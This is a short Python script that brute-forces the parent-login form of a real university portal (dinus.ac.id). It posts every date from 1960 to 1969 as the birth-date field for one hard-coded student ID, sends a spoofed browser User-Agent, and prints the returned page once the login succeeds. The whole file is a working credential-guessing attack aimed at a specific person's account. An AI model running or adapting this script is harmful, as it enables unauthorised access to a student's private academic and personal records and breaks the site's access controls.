import requests
import json
import calendar
from bs4 import BeautifulSoup

calen = calendar.Calendar()
# nama = str(input('Nama:')) #inputkan nama yang ingin dicari di https://dinus.ac.id//search/

#proses searching nama
url = 'https://dinus.ac.id/userlogin/parentauth'
nim = "A11.2019.12167"
with requests.session() as session:
	response = session.get(url)

def cari():
	for tahun in range(1960,1970):
		for bulan in range(1,13):
			date = calen.itermonthdays(tahun,bulan)
			date = [x for x in date if x != 0]
			for hari in date:
				print(tahun,bulan,hari)
				asw = (f"nim={nim}&tglmhs={tahun}-{bulan}-{hari}")
				r_post = session.post(url, data=asw, headers={
					'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.141',
					'Content-Type': 'application/x-www-form-urlencoded',
					'Connection': 'keep-alive'
				})
				if nim in r_post.text:
					return r_post

if __name__ == '__main__':
	result = cari()
	print(result.text)